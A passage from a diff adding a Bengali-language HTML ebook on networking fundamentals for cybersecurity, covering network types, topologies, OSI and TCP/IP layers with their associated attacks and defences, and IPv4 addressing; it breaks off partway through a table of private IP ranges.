@@ -1,0 +1,1699 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>সাইবার সিকিউরিটির জন্য নেটওয়ার্কিং ফান্ডামেন্টাল</title>
+<link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;400;500;600;700&family=Noto+Sans+Bengali:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --primary: #1a237e;
+    --secondary: #283593;
+    --accent: #e53935;
+    --green: #1b5e20;
+    --orange: #e65100;
+    --bg: #f8f9fa;
+    --code-bg: #1e1e2e;
+    --text: #212121;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: 'Hind Siliguri', 'Noto Sans Bengali', Arial, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    font-size: 14px;
+    line-height: 1.8;
+  }
+
+  /* PRINT BUTTON */
+  .print-btn {
+    position: fixed;
+    top: 20px;
+    right: 20px;
+    background: var(--accent);
+    color: white;
+    border: none;
+    padding: 12px 24px;
+    border-radius: 8px;
+    font-size: 15px;
+    font-family: inherit;
+    cursor: pointer;
+    z-index: 1000;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+  }
+  .print-btn:hover { background: #c62828; }
+
+  /* COVER PAGE */
+  .cover {
+    background: linear-gradient(135deg, #1a237e 0%, #283593 40%, #3949ab 100%);
+    color: white;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    padding: 60px 40px;
+    page-break-after: always;
+  }
+
+  .cover .shield {
+    font-size: 80px;
+    margin-bottom: 20px;
+  }
+
+  .cover h1 {
+    font-size: 36px;
+    font-weight: 700;
+    margin-bottom: 10px;
+    letter-spacing: 1px;
+  }
+
+  .cover h2 {
+    font-size: 22px;
+    font-weight: 400;
+    opacity: 0.85;
+    margin-bottom: 30px;
+  }
+
+  .cover .divider {
+    width: 100px;
+    height: 4px;
+    background: #ef5350;
+    border-radius: 2px;
+    margin: 20px auto;
+  }
+
+  .cover .subtitle {
+    font-size: 16px;
+    opacity: 0.75;
+    max-width: 600px;
+    line-height: 1.9;
+  }
+
+  .cover .badge {
+    display: inline-block;
+    background: rgba(255,255,255,0.15);
+    border: 1px solid rgba(255,255,255,0.3);
+    padding: 6px 18px;
+    border-radius: 20px;
+    margin: 6px;
+    font-size: 13px;
+  }
+
+  .cover .badges {
+    margin-top: 30px;
+  }
+
+  /* TABLE OF CONTENTS */
+  .toc {
+    background: white;
+    padding: 50px 60px;
+    page-break-after: always;
+  }
+
+  .toc h2 {
+    font-size: 28px;
+    color: var(--primary);
+    border-bottom: 3px solid var(--accent);
+    padding-bottom: 12px;
+    margin-bottom: 30px;
+  }
+
+  .toc-item {
+    display: flex;
+    justify-content: space-between;
+    padding: 8px 0;
+    border-bottom: 1px dotted #ddd;
+    font-size: 15px;
+  }
+
+  .toc-item.main {
+    font-weight: 600;
+    color: var(--primary);
+    font-size: 16px;
+    margin-top: 10px;
+  }
+
+  .toc-item.sub {
+    padding-left: 25px;
+    color: #555;
+    font-size: 14px;
+  }
+
+  /* CHAPTERS */
+  .chapter {
+    background: white;
+    margin: 20px 0;
+    page-break-before: always;
+  }
+
+  .chapter-header {
+    background: linear-gradient(135deg, var(--primary), var(--secondary));
+    color: white;
+    padding: 35px 50px;
+  }
+
+  .chapter-num {
+    font-size: 13px;
+    opacity: 0.7;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+  }
+
+  .chapter-title {
+    font-size: 28px;
+    font-weight: 700;
+    margin-top: 8px;
+  }
+
+  .chapter-body {
+    padding: 40px 50px;
+  }
+
+  /* SECTIONS */
+  h2.section-title {
+    font-size: 21px;
+    color: var(--primary);
+    margin: 35px 0 15px 0;
+    padding-left: 15px;
+    border-left: 5px solid var(--accent);
+  }
+
+  h3.sub-title {
+    font-size: 17px;
+    color: var(--secondary);
+    margin: 25px 0 10px 0;
+    padding-bottom: 5px;
+    border-bottom: 2px dashed #ddd;
+  }
+
+  h4.mini-title {
+    font-size: 15px;
+    color: #333;
+    margin: 18px 0 8px 0;
+    font-weight: 600;
+  }
+
+  p {
+    margin-bottom: 14px;
+    text-align: justify;
+  }
+
+  /* INFO BOXES */
+  .box {
+    padding: 18px 22px;
+    border-radius: 8px;
+    margin: 20px 0;
+    border-left: 5px solid;
+  }
+
+  .box-info {
+    background: #e3f2fd;
+    border-color: #1976d2;
+    color: #0d47a1;
+  }
+
+  .box-warning {
+    background: #fff3e0;
+    border-color: #f57c00;
+    color: #e65100;
+  }
+
+  .box-danger {
+    background: #ffebee;
+    border-color: #c62828;
+    color: #b71c1c;
+  }
+
+  .box-success {
+    background: #e8f5e9;
+    border-color: #2e7d32;
+    color: #1b5e20;
+  }
+
+  .box-title {
+    font-weight: 700;
+    margin-bottom: 8px;
+    font-size: 15px;
+  }
+
+  /* TABLES */
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 20px 0;
+    font-size: 13.5px;
+  }
+
+  thead tr {
+    background: var(--primary);
+    color: white;
+  }
+
+  th {
+    padding: 12px 15px;
+    text-align: left;
+    font-weight: 600;
+  }
+
+  td {
+    padding: 10px 15px;
+    border-bottom: 1px solid #e0e0e0;
+  }
+
+  tr:nth-child(even) { background: #f5f5f5; }
+  tr:hover { background: #e8eaf6; }
+
+  /* CODE BLOCKS */
+  .code-block {
+    background: var(--code-bg);
+    color: #cdd6f4;
+    padding: 18px 22px;
+    border-radius: 8px;
+    font-family: 'Courier New', monospace;
+    font-size: 13px;
+    margin: 18px 0;
+    overflow-x: auto;
+    line-height: 1.7;
+    border-left: 4px solid #89b4fa;
+  }
+
+  .code-block .comment { color: #6c7086; }
+  .code-block .keyword { color: #cba6f7; }
+  .code-block .string { color: #a6e3a1; }
+  .code-block .number { color: #fab387; }
+
+  /* INLINE CODE */
+  code {
+    background: #e8eaf6;
+    color: #5c6bc0;
+    padding: 2px 7px;
+    border-radius: 4px;
+    font-family: 'Courier New', monospace;
+    font-size: 13px;
+  }
+
+  /* LISTS */
+  ul, ol {
+    margin: 12px 0 12px 25px;
+    line-height: 2;
+  }
+
+  li { margin-bottom: 5px; }
+
+  /* HIGHLIGHT */
+  .highlight {
+    background: linear-gradient(135deg, #fff9c4, #fff3e0);
+    border: 1px solid #f9a825;
+    padding: 15px 20px;
+    border-radius: 8px;
+    margin: 20px 0;
+  }
+
+  /* DIAGRAM */
+  .diagram {
+    background: #f8f9fa;
+    border: 2px solid #e0e0e0;
+    border-radius: 8px;
+    padding: 20px;
+    font-family: 'Courier New', monospace;
+    font-size: 13px;
+    line-height: 1.8;
+    margin: 20px 0;
+    text-align: center;
+    color: #333;
+  }
+
+  /* GRID */
+  .grid-2 {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 20px;
+    margin: 20px 0;
+  }
+
+  .grid-card {
+    background: #f8f9fa;
+    border: 1px solid #e0e0e0;
+    border-radius: 8px;
+    padding: 18px;
+  }
+
+  .grid-card h4 {
+    color: var(--primary);
+    margin-bottom: 10px;
+    font-size: 15px;
+  }
+
+  /* PORT TABLE */
+  .port-badge {
+    display: inline-block;
+    background: var(--primary);
+    color: white;
+    padding: 2px 10px;
+    border-radius: 12px;
+    font-size: 12px;
+    font-weight: 600;
+  }
+
+  /* CHAPTER SUMMARY */
+  .summary {
+    background: linear-gradient(135deg, #e8eaf6, #f3e5f5);
+    border-radius: 10px;
+    padding: 25px 30px;
+    margin-top: 40px;
+  }
+
+  .summary h3 {
+    color: var(--primary);
+    margin-bottom: 15px;
+    font-size: 18px;
+  }
+
+  /* PRINT STYLES */
+  @media print {
+    .print-btn { display: none; }
+    body { background: white; }
+    .chapter { margin: 0; }
+    .chapter-header { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+    thead tr { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+    .cover { -webkit-print-color-adjust: exact; print-color-adjust: exact; min-height: auto; padding: 80px 40px; }
+  }
+</style>
+</head>
+<body>
+
+<button class="print-btn" onclick="window.print()">🖨️ PDF হিসেবে সেভ করুন</button>
+
+<!-- COVER PAGE -->
+<div class="cover">
+  <div class="shield">🛡️</div>
+  <div class="chapter-num">Cyber Security Series</div>
+  <h1>সাইবার সিকিউরিটির জন্য</h1>
+  <h2>নেটওয়ার্কিং ফান্ডামেন্টাল</h2>
+  <div class="divider"></div>
+  <p class="subtitle">
+    একজন সাইবার সিকিউরিটি প্রফেশনাল হতে হলে নেটওয়ার্কিংয়ের যা যা জানা দরকার —
+    OSI মডেল থেকে শুরু করে ফায়ারওয়াল, VPN, প্রোটোকল, ক্রিপ্টোগ্রাফি
+    পর্যন্ত সব কিছু বিস্তারিত।
+  </p>
+  <div class="badges">
+    <span class="badge">🔰 Beginner থেকে Advanced</span>
+    <span class="badge">📚 সম্পূর্ণ বাংলায়</span>
+    <span class="badge">🔒 Security Focused</span>
+    <span class="badge">💻 Hands-on Examples</span>
+  </div>
+</div>
+
+<!-- TABLE OF CONTENTS -->
+<div class="toc">
+  <h2>📋 বিষয়সূচি</h2>
+
+  <div class="toc-item main"><span>অধ্যায় ১ — নেটওয়ার্কিং এর মূল ধারণা</span><span>৩</span></div>
+  <div class="toc-item sub"><span>নেটওয়ার্ক কী, নেটওয়ার্কের প্রকারভেদ</span></div>
+  <div class="toc-item sub"><span>নেটওয়ার্ক টপোলজি</span></div>
+  <div class="toc-item sub"><span>ডেটা ট্রান্সমিশন মিডিয়া</span></div>
+
+  <div class="toc-item main"><span>অধ্যায় ২ — OSI ও TCP/IP মডেল</span><span>৫</span></div>
+  <div class="toc-item sub"><span>OSI মডেলের ৭টি লেয়ার বিস্তারিত</span></div>
+  <div class="toc-item sub"><span>TCP/IP মডেল</span></div>
+  <div class="toc-item sub"><span>Data Encapsulation</span></div>
+
+  <div class="toc-item main"><span>অধ্যায় ৩ — IP অ্যাড্রেসিং</span><span>৮</span></div>
+  <div class="toc-item sub"><span>IPv4 ও IPv6 বিস্তারিত</span></div>
+  <div class="toc-item sub"><span>সাবনেটিং ও CIDR</span></div>
+  <div class="toc-item sub"><span>Public vs Private IP, NAT</span></div>
+
+  <div class="toc-item main"><span>অধ্যায় ৪ — গুরুত্বপূর্ণ প্রোটোকল</span><span>১১</span></div>
+  <div class="toc-item sub"><span>TCP vs UDP</span></div>
+  <div class="toc-item sub"><span>HTTP/HTTPS, DNS, DHCP, FTP, SSH, SMTP</span></div>
+  <div class="toc-item sub"><span>গুরুত্বপূর্ণ পোর্ট নম্বর</span></div>
+
+  <div class="toc-item main"><span>অধ্যায় ৫ — নেটওয়ার্ক ডিভাইস</span><span>১৪</span></div>
+  <div class="toc-item sub"><span>Hub, Switch, Router, Gateway</span></div>
+  <div class="toc-item sub"><span>Firewall, IDS/IPS, Proxy</span></div>
+
+  <div class="toc-item main"><span>অধ্যায় ৬ — DNS বিস্তারিত</span><span>১৬</span></div>
+  <div class="toc-item sub"><span>DNS কীভাবে কাজ করে, Record Types</span></div>
+  <div class="toc-item sub"><span>DNS অ্যাটাক ও সুরক্ষা</span></div>
+
+  <div class="toc-item main"><span>অধ্যায় ৭ — ওয়্যারলেস নেটওয়ার্কিং</span><span>১৮</span></div>
+  <div class="toc-item sub"><span>WiFi স্ট্যান্ডার্ড, WPA2/WPA3</span></div>
+  <div class="toc-item sub"><span>ওয়্যারলেস অ্যাটাক ও সুরক্ষা</span></div>
+
+  <div class="toc-item main"><span>অধ্যায় ৮ — ক্রিপ্টোগ্রাফি</span><span>২০</span></div>
+  <div class="toc-item sub"><span>Symmetric ও Asymmetric Encryption</span></div>
+  <div class="toc-item sub"><span>TLS/SSL, PKI, Certificate</span></div>
+  <div class="toc-item sub"><span>Hashing ও Digital Signature</span></div>
+
+  <div class="toc-item main"><span>অধ্যায় ৯ — নেটওয়ার্ক সিকিউরিটি কনসেপ্ট</span><span>২৩</span></div>
+  <div class="toc-item sub"><span>Firewall Rules, VPN, Zero Trust</span></div>
+  <div class="toc-item sub"><span>Common Network Attacks</span></div>
+
+  <div class="toc-item main"><span>অধ্যায় ১০ — নেটওয়ার্ক অ্যানালাইসিস টুল</span><span>২৬</span></div>
+  <div class="toc-item sub"><span>Wireshark, Nmap, Netcat, tcpdump</span></div>
+  <div class="toc-item sub"><span>প্যাকেট অ্যানালাইসিস</span></div>
+</div>
+
+<!-- CHAPTER 1 -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">CHAPTER 01</div>
+    <div class="chapter-title">🌐 নেটওয়ার্কিংয়ের মূল ধারণা</div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="section-title">নেটওয়ার্ক কী?</h2>
+    <p>নেটওয়ার্ক হলো দুই বা তার বেশি কম্পিউটার বা ডিভাইসের সমষ্টি যারা একে অপরের সাথে যোগাযোগ করতে পারে এবং রিসোর্স শেয়ার করতে পারে। উদাহরণস্বরূপ: তোমার বাড়ির WiFi নেটওয়ার্কে মোবাইল, ল্যাপটপ ও স্মার্ট টিভি একসাথে ইন্টারনেট ব্যবহার করে — এটাই একটি নেটওয়ার্ক।</p>
+
+    <h2 class="section-title">নেটওয়ার্কের প্রকারভেদ</h2>
+
+    <table>
+      <thead>
+        <tr><th>ধরন</th><th>পূর্ণ নাম</th><th>পরিসর</th><th>উদাহরণ</th><th>সিকিউরিটি ঝুঁকি</th></tr>
+      </thead>
+      <tbody>
+        <tr><td><strong>PAN</strong></td><td>Personal Area Network</td><td>১০ মিটার</td><td>Bluetooth, USB</td><td>Bluetooth sniffing</td></tr>
+        <tr><td><strong>LAN</strong></td><td>Local Area Network</td><td>১ ভবন</td><td>অফিস নেটওয়ার্ক</td><td>ARP Spoofing, MITM</td></tr>
+        <tr><td><strong>MAN</strong></td><td>Metropolitan Area Network</td><td>একটি শহর</td><td>ISP নেটওয়ার্ক</td><td>BGP Hijacking</td></tr>
+        <tr><td><strong>WAN</strong></td><td>Wide Area Network</td><td>দেশ/বিশ্ব</td><td>ইন্টারনেট</td><td>সব ধরনের অ্যাটাক</td></tr>
+        <tr><td><strong>WLAN</strong></td><td>Wireless LAN</td><td>১ ভবন</td><td>WiFi নেটওয়ার্ক</td><td>Evil Twin, Deauth</td></tr>
+        <tr><td><strong>VPN</strong></td><td>Virtual Private Network</td><td>যেকোনো</td><td>Remote work</td><td>VPN misconfiguration</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="section-title">নেটওয়ার্ক টপোলজি</h2>
+    <p>টপোলজি হলো নেটওয়ার্কের ডিভাইসগুলো কীভাবে সংযুক্ত — এই বিন্যাস। সিকিউরিটির দৃষ্টিকোণ থেকে টপোলজি বোঝা গুরুত্বপূর্ণ কারণ এটি ব্যর্থতার সম্ভাব্য পয়েন্ট (Single Point of Failure) নির্ধারণ করে।</p>
+
+    <div class="grid-2">
+      <div class="grid-card">
+        <h4>⭐ Star Topology</h4>
+        <p>সব ডিভাইস একটি কেন্দ্রীয় Switch/Hub-এর সাথে সংযুক্ত।</p>
+        <p><strong>সুবিধা:</strong> একটি সংযোগ ব্যর্থ হলে অন্যরা চলে</p>
+        <p><strong>ঝুঁকি:</strong> কেন্দ্রীয় Switch হ্যাক হলে পুরো নেটওয়ার্ক ঝুঁকিতে</p>
+        <p><strong>ব্যবহার:</strong> বেশিরভাগ অফিস LAN</p>
+      </div>
+      <div class="grid-card">
+        <h4>🔵 Bus Topology</h4>
+        <p>সব ডিভাইস একটি মূল তার (Backbone) এর সাথে সংযুক্ত।</p>
+        <p><strong>সুবিধা:</strong> সহজ ও কম খরচ</p>
+        <p><strong>ঝুঁকি:</strong> Packet Sniffing খুব সহজ — যে কেউ সব ট্র্যাফিক দেখতে পারে</p>
+        <p><strong>ব্যবহার:</strong> পুরনো নেটওয়ার্ক</p>
+      </div>
+      <div class="grid-card">
+        <h4>💍 Ring Topology</h4>
+        <p>ডিভাইসগুলো বৃত্তাকারে সংযুক্ত।</p>
+        <p><strong>সুবিধা:</strong> ডেটা সংঘর্ষ কম</p>
+        <p><strong>ঝুঁকি:</strong> একটি সংযোগ ভাঙলে পুরো নেটওয়ার্ক বিচ্ছিন্ন</p>
+        <p><strong>ব্যবহার:</strong> Token Ring (পুরনো)</p>
+      </div>
+      <div class="grid-card">
+        <h4>🕸️ Mesh Topology</h4>
+        <p>প্রতিটি ডিভাইস অন্য সবার সাথে সংযুক্ত।</p>
+        <p><strong>সুবিধা:</strong> অত্যন্ত নির্ভরযোগ্য, রিডান্ডেন্ট পাথ</p>
+        <p><strong>ঝুঁকি:</strong> জটিল, ব্যবস্থাপনা কঠিন</p>
+        <p><strong>ব্যবহার:</strong> ইন্টারনেট ব্যাকবোন, মিলিটারি নেটওয়ার্ক</p>
+      </div>
+    </div>
+
+    <h2 class="section-title">ডেটা ট্রান্সমিশন মিডিয়া</h2>
+
+    <h3 class="sub-title">তারযুক্ত মিডিয়া (Wired)</h3>
+    <table>
+      <thead><tr><th>মিডিয়া</th><th>গতি</th><th>দূরত্ব</th><th>সিকিউরিটি ঝুঁকি</th></tr></thead>
+      <tbody>
+        <tr><td>Twisted Pair (UTP/STP)</td><td>১০Mbps - ১০Gbps</td><td>১০০ মিটার</td><td>Physical tapping সম্ভব</td></tr>
+        <tr><td>Coaxial Cable</td><td>১০Mbps - ১Gbps</td><td>৫০০ মিটার</td><td>Eavesdropping সহজ</td></tr>
+        <tr><td>Fiber Optic</td><td>১Gbps - ১০০Tbps</td><td>কিলোমিটার</td><td>সবচেয়ে নিরাপদ, tap করা কঠিন</td></tr>
+      </tbody>
+    </table>
+
+    <h3 class="sub-title">তারবিহীন মিডিয়া (Wireless)</h3>
+    <table>
+      <thead><tr><th>মিডিয়া</th><th>ফ্রিকোয়েন্সি</th><th>পরিসর</th><th>সিকিউরিটি ঝুঁকি</th></tr></thead>
+      <tbody>
+        <tr><td>WiFi (802.11)</td><td>2.4 GHz / 5 GHz</td><td>৩০-১০০ মিটার</td><td>Evil Twin, Deauth Attack</td></tr>
+        <tr><td>Bluetooth</td><td>2.4 GHz</td><td>১০-১০০ মিটার</td><td>Bluejacking, Bluesnarfing</td></tr>
+        <tr><td>Cellular (4G/5G)</td><td>700MHz-6GHz</td><td>কিলোমিটার</td><td>IMSI Catcher, SS7 Attack</td></tr>
+        <tr><td>Microwave</td><td>GHz রেঞ্জ</td><td>কিলোমিটার</td><td>Signal Interception</td></tr>
+        <tr><td>Satellite</td><td>GHz রেঞ্জ</td><td>বৈশ্বিক</td><td>Signal Spoofing</td></tr>
+      </tbody>
+    </table>
+
+    <div class="box box-info">
+      <div class="box-title">🔒 সিকিউরিটি নোট</div>
+      Wireless মিডিয়া সবচেয়ে বেশি ঝুঁকিপূর্ণ কারণ সংকেত বাতাসের মধ্য দিয়ে যায় এবং যে কেউ ধরতে পারে। Fiber Optic সবচেয়ে নিরাপদ কারণ আলোক সংকেত বাঁকানো ছাড়া ধরা প্রায় অসম্ভব এবং tap করলে সংযোগ বিচ্ছিন্ন হয়।
+    </div>
+
+  </div>
+</div>
+
+<!-- CHAPTER 2 -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">CHAPTER 02</div>
+    <div class="chapter-title">📚 OSI ও TCP/IP মডেল</div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="section-title">OSI মডেল কী?</h2>
+    <p>OSI (Open Systems Interconnection) মডেল হলো নেটওয়ার্ক যোগাযোগের একটি কনসেপচুয়াল ফ্রেমওয়ার্ক যা ISO তৈরি করেছে। এটি নেটওয়ার্ক ফাংশনকে ৭টি লেয়ারে ভাগ করে। সাইবার সিকিউরিটিতে প্রতিটি লেয়ারে আলাদা ধরনের অ্যাটাক হয়।</p>
+
+    <div class="diagram">
+<pre>
+┌─────────────────────────────────────────────────────┐
+│  লেয়ার ৭ │  Application Layer  │  HTTP, FTP, DNS   │
+├─────────────────────────────────────────────────────┤
+│  লেয়ার ৬ │  Presentation Layer │  SSL/TLS, JPEG    │
+├─────────────────────────────────────────────────────┤
+│  লেয়ার ৫ │  Session Layer      │  NetBIOS, RPC     │
+├─────────────────────────────────────────────────────┤
+│  লেয়ার ৪ │  Transport Layer    │  TCP, UDP         │
+├─────────────────────────────────────────────────────┤
+│  লেয়ার ৩ │  Network Layer      │  IP, ICMP, ARP    │
+├─────────────────────────────────────────────────────┤
+│  লেয়ার ২ │  Data Link Layer    │  Ethernet, MAC    │
+├─────────────────────────────────────────────────────┤
+│  লেয়ার ১ │  Physical Layer     │  Cables, Signals  │
+└─────────────────────────────────────────────────────┘
+</pre>
+    </div>
+
+    <h3 class="sub-title">লেয়ার ১ — Physical Layer (ভৌত স্তর)</h3>
+    <p><strong>কাজ:</strong> বিট (0 ও 1) কে ইলেকট্রিক সিগন্যাল, আলো বা রেডিও তরঙ্গে রূপান্তর করে পাঠানো।</p>
+    <ul>
+      <li>ডেটা ইউনিট: <strong>Bit</strong></li>
+      <li>ডিভাইস: Hub, Repeater, Cable, Network Interface Card</li>
+      <li>সিকিউরিটি অ্যাটাক: Physical tapping, Wiretapping, Cable cutting (DoS)</li>
+      <li>সুরক্ষা: Physical security, Fiber Optic ব্যবহার, CCTV</li>
+    </ul>
+
+    <h3 class="sub-title">লেয়ার ২ — Data Link Layer (ডেটা লিংক স্তর)</h3>
+    <p><strong>কাজ:</strong> নোড থেকে নোডে ডেটা ফ্রেম পাঠানো। MAC Address ব্যবহার করে।</p>
+    <ul>
+      <li>ডেটা ইউনিট: <strong>Frame</strong></li>
+      <li>ডিভাইস: Switch, Bridge, NIC</li>
+      <li>প্রোটোকল: Ethernet, PPP, ARP, VLAN (802.1Q)</li>
+      <li>সিকিউরিটি অ্যাটাক: <strong>ARP Spoofing/Poisoning</strong>, MAC Flooding, VLAN Hopping</li>
+      <li>সুরক্ষা: Dynamic ARP Inspection, Port Security, 802.1X Authentication</li>
+    </ul>
+
+    <div class="box box-danger">
+      <div class="box-title">⚠️ ARP Spoofing — সবচেয়ে বিপজ্জনক লেয়ার ২ অ্যাটাক</div>
+      হ্যাকার নকল ARP Reply পাঠিয়ে বলে "আমিই গেটওয়ে!" — ফলে সব ট্র্যাফিক হ্যাকারের মধ্য দিয়ে যায়। এটি Man-in-the-Middle অ্যাটাকের ভিত্তি।
+    </div>
+
+    <h3 class="sub-title">লেয়ার ৩ — Network Layer (নেটওয়ার্ক স্তর)</h3>
+    <p><strong>কাজ:</strong> সোর্স থেকে ডেস্টিনেশনে প্যাকেট রাউটিং করা। IP Address ব্যবহার করে।</p>
+    <ul>
+      <li>ডেটা ইউনিট: <strong>Packet</strong></li>
+      <li>ডিভাইস: Router, Layer 3 Switch</li>
+      <li>প্রোটোকল: IP (v4/v6), ICMP, OSPF, BGP, RIP</li>
+      <li>সিকিউরিটি অ্যাটাক: IP Spoofing, ICMP Flood (Ping of Death), BGP Hijacking, TTL Manipulation</li>
+      <li>সুরক্ষা: Ingress/Egress Filtering, IPsec, Firewall ACL</li>
+    </ul>
+
+    <h3 class="sub-title">লেয়ার ৪ — Transport Layer (ট্রান্সপোর্ট স্তর)</h3>
+    <p><strong>কাজ:</strong> End-to-end যোগাযোগ নিশ্চিত করা। পোর্ট নম্বর ব্যবহার করে।</p>
+    <ul>
+      <li>ডেটা ইউনিট: <strong>Segment (TCP) / Datagram (UDP)</strong></li>
+      <li>প্রোটোকল: TCP, UDP, SCTP</li>
+      <li>সিকিউরিটি অ্যাটাক: <strong>SYN Flood</strong>, Port Scanning, Session Hijacking, UDP Flood</li>
+      <li>সুরক্ষা: SYN Cookies, Rate Limiting, Stateful Firewall</li>
+    </ul>
+
+    <h3 class="sub-title">লেয়ার ৫, ৬, ৭ — Session, Presentation, Application</h3>
+    <table>
+      <thead><tr><th>লেয়ার</th><th>কাজ</th><th>প্রোটোকল</th><th>অ্যাটাক</th></tr></thead>
+      <tbody>
+        <tr><td>Session (৫)</td><td>সংযোগ স্থাপন ও শেষ করা</td><td>NetBIOS, RPC, NFS</td><td>Session Hijacking, Pass-the-Hash</td></tr>
+        <tr><td>Presentation (৬)</td><td>ডেটা এনকোড/ডিকোড, এনক্রিপশন</td><td>SSL/TLS, JPEG, ASCII</td><td>SSL Stripping, Cipher Downgrade</td></tr>
+        <tr><td>Application (৭)</td><td>ইউজার অ্যাপ্লিকেশন সেবা</td><td>HTTP, FTP, DNS, SMTP</td><td>SQLi, XSS, DNS Spoofing, Phishing</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="section-title">TCP/IP মডেল</h2>
+    <p>TCP/IP মডেল বাস্তবে ইন্টারনেটে ব্যবহৃত হয়। এটি OSI-এর ৭ লেয়ারকে ৪ লেয়ারে সংকুচিত করে।</p>
+
+    <table>
+      <thead><tr><th>TCP/IP লেয়ার</th><th>OSI সমতুল্য</th><th>প্রোটোকল</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Application</strong></td><td>লেয়ার ৫, ৬, ৭</td><td>HTTP, HTTPS, DNS, FTP, SSH, SMTP, POP3</td></tr>
+        <tr><td><strong>Transport</strong></td><td>লেয়ার ৪</td><td>TCP, UDP</td></tr>
+        <tr><td><strong>Internet</strong></td><td>লেয়ার ৩</td><td>IP, ICMP, ARP, OSPF, BGP</td></tr>
+        <tr><td><strong>Network Access</strong></td><td>লেয়ার ১, ২</td><td>Ethernet, WiFi, PPP</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="section-title">Data Encapsulation — ডেটা কীভাবে যায়?</h2>
+    <div class="diagram">
+<pre>
+পাঠানোর সময় (Sender):
+Application Data: [DATA]
+Transport adds header: [TCP Header][DATA]              → Segment
+Network adds header:   [IP Header][TCP Header][DATA]   → Packet
+Data Link adds frame:  [ETH][IP][TCP][DATA][FCS]       → Frame
+Physical:              0101010101... (bits)              → Bits
+
+পাওয়ার সময় (Receiver):
+বিপরীত ক্রমে প্রতিটি লেয়ার Header খুলে ফেলে।
+</pre>
+    </div>
+
+    <div class="box box-success">
+      <div class="box-title">✅ মনে রাখার সহজ উপায়</div>
+      OSI মডেল মনে রাখতে: <strong>"Please Do Not Throw Sausage Pizza Away"</strong><br>
+      P=Physical, D=Data Link, N=Network, T=Transport, S=Session, P=Presentation, A=Application
+    </div>
+
+  </div>
+</div>
+
+<!-- CHAPTER 3 -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">CHAPTER 03</div>
+    <div class="chapter-title">🔢 IP অ্যাড্রেসিং ও সাবনেটিং</div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="section-title">IP Address কী?</h2>
+    <p>IP (Internet Protocol) Address হলো প্রতিটি নেটওয়ার্ক ডিভাইসের একটি অনন্য পরিচয়পত্র। ঠিক যেমন বাড়ির ঠিকানা দিয়ে চিঠি পাঠানো হয়, তেমনি IP Address দিয়ে ডেটা প্যাকেট পাঠানো হয়।</p>
+
+    <h2 class="section-title">IPv4 বিস্তারিত</h2>
+    <p>IPv4 হলো ৩২-বিটের একটি সংখ্যা যা ৪টি অক্টেটে (৮ বিট করে) লেখা হয়।</p>
+
+    <div class="diagram">
+<pre>
+উদাহরণ: 192.168.1.100
+
+বাইনারি:
+11000000 . 10101000 . 00000001 . 01100100
+   192   .    168   .     1    .    100
+
+মোট বিট: 32
+মোট সম্ভাব্য IP: 2^32 = প্রায় ৪.৩ বিলিয়ন
+</pre>
+    </div>
+
+    <h3 class="sub-title">IPv4 ক্লাস</h3>
+    <table>
+      <thead><tr><th>ক্লাস</th><th>রেঞ্জ</th><th>ডিফল্ট Subnet Mask</th><th>ব্যবহার</th><th>হোস্ট সংখ্যা</th></tr></thead>
+      <tbody>
+        <tr><td><strong>A</strong></td><td>1.0.0.0 – 126.255.255.255</td><td>255.0.0.0 (/8)</td><td>বড় সংস্থা</td><td>১৬,৭৭৭,২১৪</td></tr>
+        <tr><td><strong>B</strong></td><td>128.0.0.0 – 191.255.255.255</td><td>255.255.0.0 (/16)</td><td>মাঝারি সংস্থা</td><td>৬৫,৫৩৪</td></tr>
+        <tr><td><strong>C</strong></td><td>192.0.0.0 – 223.255.255.255</td><td>255.255.255.0 (/24)</td><td>ছোট নেটওয়ার্ক</td><td>২৫৪</td></tr>
+        <tr><td><strong>D</strong></td><td>224.0.0.0 – 239.255.255.255</td><td>—</td><td>Multicast</td><td>—</td></tr>
+        <tr><td><strong>E</strong></td><td>240.0.0.0 – 255.255.255.255</td><td>—</td><td>Research/Reserved</td><td>—</td></tr>
+      </tbody>
+    </table>
+
+    <h3 class="sub-title">Private vs Public IP Address</h3>
+    <table>
+      <thead><tr><th>ধরন</th><th>রেঞ্জ</th><th>ব্যবহার</th><th>সিকিউরিটি</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Private A</strong></td><td>10.0.0.0/8</td><td>বড় কর্পোরেট নেটওয়ার্ক</td><td>ইন্টারনেট থেকে সরাসরি অ্যাক্সেসযোগ্য নয়</td></tr>
+        <tr><td><strong>Private B</strong></td><td>172.16.0.0/12</td><td>মাঝারি নেটওয়ার্ক</td><td>ইন্টারনেট থেকে সরাসরি অ্যাক্সেসযোগ্য নয়</td></tr>
+        <tr><td><strong>Private C</strong></td><td>192.168.0.0/16</td><td>হোম/অফিস নেটওয়ার্ক</td><td>ইন্টারনেট থেকে সরাসরি অ্যাক্সেসযোগ্য নয়</td></tr>
+        <tr><td><strong>Loopback</strong></td><td>127.0.0.1</td><td>নিজের সাথে যোগাযোগ</td><td>localhost — শুধু নিজের সিস্টেম</td></tr>
+        <tr><td><strong>APIPA</strong></td><td>169.254.0.0/16</td><td>DHCP না পেলে</td><td>DHCP Server সমস্যার নির্দেশক</td></tr>
